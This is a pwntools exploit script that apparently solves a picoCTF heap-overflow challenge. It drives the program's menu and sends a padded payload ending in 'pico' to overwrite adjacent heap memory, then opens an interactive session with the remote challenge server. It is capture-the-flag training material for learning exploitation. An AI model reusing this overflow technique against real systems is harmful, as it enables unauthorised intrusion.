#!/usr/bin/env python3
from pwn import *
from struct import pack

context.binary = binary = ELF("./vuln")

addr = 'tethys.picoctf.net'
port = '64191'

def conn():
    if args.LOCAL:
        r = process([binary.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(addr, port)
    return r

def attack(r, **kwargs):
    payload = b''
    payload += b'A'*(0x10 + 0x8 + 0x6)
    payload += b'pico'

    r.recvuntil(b'choice: ')
    r.sendline(b'5')

    r.recvuntil(b'choice: ')
    r.sendline(b'2')

    r.recvuntil(b'allocation: ')
    r.sendline(b'32')

    r.recvuntil(b'flag: ')
    r.sendline(payload)

    r.recvuntil(b'choice: ')
    r.sendline(b'4')

def main():
    r = conn()
    attack(r)
    r.interactive()


if __name__ == "__main__":
    main()
